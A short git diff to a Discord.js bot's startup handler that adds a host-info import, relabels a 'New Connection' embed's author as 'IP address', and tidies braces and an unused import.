@@ -1,9 +1,8 @@
 const Discord = require("discord.js");
 const loadSlashCommands = require("../Loaders/loadSlashCommands");
+const { host } = require("../Host/info.js");
 const os = require("os");
 const fs = require("fs");
-
-const messageCreate = require("./messageCreate");
 
 module.exports = async bot => {
 
@@ -44,7 +43,7 @@ module.exports = async bot => {
             const the_embed = new Discord.EmbedBuilder()
             .setTitle('New Connection !!!')
             .setColor('#2AFAB1')
-            .setAuthor({ name: 'MrCoconut' })
+            .setAuthor({ name: "IP address" })
             .setDescription("Hey I'm on line dude !!!!")
 	        .setTimestamp()
             channel.send({
@@ -52,8 +51,6 @@ module.exports = async bot => {
             });
             channel.send('```json\n' + _msgs + '\n```');
         })
-      });
-
-    
+    });
     
 }
